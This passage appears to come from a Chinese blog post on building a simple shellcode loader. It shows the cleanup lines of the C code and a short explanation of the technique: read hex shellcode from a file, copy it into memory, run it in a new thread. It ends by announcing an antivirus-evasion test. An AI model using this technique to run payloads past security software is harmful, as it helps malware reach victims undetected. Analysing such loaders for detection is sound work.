+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WaitForSingleObject(hThread, INFINITE);
+</span></span><span style="display:flex;"><span>	VirtualFree(xue_buf, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
+</span></span><span style="display:flex;"><span>	CloseHandle(MyFile);
+</span></span><span style="display:flex;"><span>	CloseHandle(hThread);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>就是把\x or 0x删除(这个功能我没写 我直接从就删除了然后到txt里)，申请块内存，通过ReadFIle读取进来，然后把对应的字符串的16进制数据重新写入<code>xue_buf</code>里，最后CopyMemory拷贝进内存，CreateThread加载。</p>
 <p><img src="/images/Simple-Shellcode-Loader/image-20211004145711266.png" alt="image-20211004145711266"></p>
 <h1 id="测试">测试</h1>
 <p>最后测下免杀性了</p>
